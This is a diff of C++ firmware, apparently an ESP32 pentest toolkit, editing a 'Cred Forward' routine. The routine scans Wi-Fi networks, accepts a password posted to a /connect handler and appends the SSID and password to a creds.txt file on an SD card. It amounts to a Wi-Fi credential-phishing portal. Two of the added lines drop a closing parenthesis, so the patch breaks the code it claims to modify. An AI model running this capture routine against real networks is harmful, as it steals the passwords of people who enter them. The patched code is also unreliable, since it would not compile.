@@ -110,13 +110,13 @@ static void setupFwdRoutes(String ssid) {
 
 
     fwdServer->on("/connect", HTTP_POST, [](AsyncWebServerRequest *request) {
-        if (request->hasArg("password")) {
+        if (request->hasArg("password") {
             capturedPassword = request->arg("password");
             credsCaptured = true;
 
 
             if (setupSdCard()) {
-                if (!SD.exists("/arsenal")) SD.mkdir("/arsenal");
+                if (!SD.exists("/arsenal") SD.mkdir("/arsenal");
                 File f = SD.open("/arsenal/creds.txt", FILE_APPEND);
                 if (f) {
                     f.printf("[CredFwd] SSID:%s PASS:%s\n", targetSSID.c_str(), capturedPassword.c_str());
@@ -147,7 +147,7 @@ void arsenal_cred_forward(void) {
         drawMainBorderWithTitle("Cred Forward");
         tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
         tft.setTextSize(FP);
-        tft.drawCentreString("Scanning networks...", tftWidth / 2, tftHeight / 2, 1);
+        tft.drawCentreString(String("Scanning networks..."), tftWidth / 2, tftHeight / 2, 1);
 
         WiFi.mode(WIFI_STA);
         int n = WiFi.scanNetworks(false, false);
@@ -269,7 +269,7 @@ void arsenal_cred_forward(void) {
             }
 
             tft.setTextColor(TFT_RED, bruceConfig.bgColor);
-            tft.drawCentreString("Esc to stop", tftWidth / 2, tftHeight - 18, 1);
+            tft.drawCentreString(String("Esc to stop"), tftWidth / 2, tftHeight - 18, 1);
 
             if (check(EscPress)) break;
             esp_task_wdt_reset();
